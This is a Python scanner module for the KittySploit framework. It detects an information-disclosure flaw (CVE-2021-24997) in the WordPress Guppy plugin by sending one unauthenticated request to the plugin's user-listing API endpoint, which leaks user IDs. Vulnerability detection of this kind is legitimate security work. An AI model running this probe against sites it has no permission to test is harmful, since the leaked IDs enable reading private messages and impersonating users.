#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Guppy plugin through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Guppy <=1.1 - Information Disclosure Detection',
        'description': 'WordPress Guppy plugin through 1.1 is susceptible to an API disclosure vulnerability. This can allow an attacker to obtain all user IDs and then use them to make API requests to get messages sent between users and/or send messages posing as one user to another.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'guppy', 'api', 'wp-plugin', 'edb', 'wpscan', 'wp-guppy', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50540',
            'https://patchstack.com/database/vulnerability/wp-guppy/wordpress-wp-guppy-plugin-1-2-sensitive-information-disclosure-vulnerability',
            'https://wpscan.com/vulnerability/747e6c7e-a167-4d82-b6e6-9e8613f0e900',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24997',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24997',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"guppyUsers":', '"userId":', '"type":',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress Guppy <=1.1 - Information Disclosure detected",
                path='/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search=',
            )
            return True
        return False

